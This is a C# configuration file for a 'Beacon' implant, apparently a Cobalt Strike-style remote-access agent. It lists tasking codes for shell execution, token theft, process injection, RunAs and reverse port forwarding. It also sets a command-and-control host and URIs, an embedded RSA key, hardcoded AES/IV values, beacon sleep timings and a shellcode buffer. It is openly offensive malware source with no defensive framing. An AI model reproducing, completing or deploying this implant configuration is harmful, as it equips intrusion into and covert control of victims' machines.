using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Beacon.Crypt;
using Beacon.Crypt.Internal;

namespace Beacon.Profiles
{
    public class Config
    {
        //_pBeaconID
        public static int _nBeaconID;

        public static int alivepacketcount = 0;
        public enum FUNCINDEX 
        {
            	SLEEP        = 4,
                EXECUTE      = 12,
	            SHELL        = 78,
	            UPLOAD_START = 10,
	            UPLOAD_LOOP  = 67,
	            DOWNLOAD     = 11,
                LS           = 53,
                MKDIR        = 54,
                RM           = 56,
	            EXIT         = 3,
	            CD           = 5,
	            PWD          = 39,
	            FILE_BROWSE  = 53,
                Kill         = 33,
                RUNAS        = 38,
                RUN          = 78,
                SETENV       = 72,
                COPYFILE     = 73,
                MOVEFILE     = 74,
                PS           = 32,
                DRIVES       = 55,
                MAKE_TOKEN   = 49,
                STEAL_TOKEN  = 31,
                REV2SELF     = 28,
                INJECT_X86   = 9,
                INJECT_X64   = 43,
                GETUID       = 27,
                RPORTFWD     = 50,
                RPORTFWD_STOP= 51,
                RUNU         = 76,
                GETPRIVS     = 77,
        };

    
        public static RsaKey _key = new RsaKey
        {
            Private = @"-----BEGIN PRIVATE KEY-----
-----END PRIVATE KEY-----
",
            Public = @"-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGb3DQEBAQUAA4GNADCCnCZHWnYFqYB/6gJdkc4MPDTtBJ20nkEAd3tsY4tPKs8MV4yIjJb5CtlrbKHjzP1oD/1AQsj6EKlEMFIKtakLx5+VybrMYE+dDdkDteHmVX0AeFyw001FyQVlt1B+OSNPRscKI5sh1L/ZdwnrMy6S6nNbQ5N5hls6k2kgNO5nQ7QIDAQAB
-----END PUBLIC KEY-----
"
        };

        //IV
        public static string _IV = "abcdefghijklmnop";

        //HmacKey
        public static byte[] _HmacKey;

        //AesKey
        public static byte[] _AesKey;

        //GlobalKey
        public static byte[] GlobalKey = new byte[16] { 1,2,4,1,1,5,1,1,7,1,6,1,3,1,1,1};

        //User-agent

        //maxAttempts
        public static int _maxAttempts = 10;

        //retryInterval
        public static int _retryInterval = 100000;

        //GETURL
        //public static string _GETURL = "https://192.168.8.3/match";

        //public static string _POSTURL = "https://192.168.8.3/submit.php?id=";

        public static string Host = " http://192.168.8.3";

        public static string GETURI = "/dpixel";

        public static string POSTURI = "/submit.php";

        public static string _GETURL = Host + GETURI;

        public static string[] HttpGetClientMetaEncrytFunc = { "none" };
        public static string[] HttpGetServerOutputEncrytFunc = { "none" };
        public static string[] HttpPostClientIDEncrytFunc ={ "none" };
        public static string[] HttpPostClientOutputEncrytFunc = { "none" };
        public static string[] HttpPostServerOutputEncrytFunc = { "none" };


        public static string[] httpGetClientMetaPrepend = { 

        };
        public static string[] httpGetClientMetaAppend = { 
        };


        public static string[] httpGetServerOutputPrepend = {
            
        };
        public static string[] httpGetServerOutputAppend = {
            
        };

        public static string[] httpPostClientOutputPrepend = {

        };
        public static string[] httpPostClientOutputAppend = { 
        };

        public static string[] httpPostServerOutputPrepend = { 
            
        };
        public static string[] httpPostServerOutputAppend = {
            
        };


        public static string HttpMetaField = "Cookie";
        public static string HttpPostParameter = "id";

        public static string _POSTURL = $@"{Host}{POSTURI}?{HttpPostParameter}=";


        //sleepTime
        public static int _nSleepTime = 5000;

        //ProcWaitTime
        public static int _nProcWaitTime = 10000;

        //CallbackCount
        public static int _nCount = 0;

        //MagicHeader
        public static int _nMagicHeader = 48879;

        //KilDate

        //Logon
        public static string _sLogonUser = "";
        public static string _sLogonPass = "";
        public static string _sLogonDomain = "";

        //Token
        public static IntPtr _TokenPtr = new IntPtr();

        //cs shellcode
       public static byte[] _pShellcodeBuf_X64 = { };
        //public static byte[] _pShellcodeBuf_X86 = { };

        //转发的端口和地址
        public static string _sForwardHost = "";
        public static int _nForwardPort = 22222;
    }
}
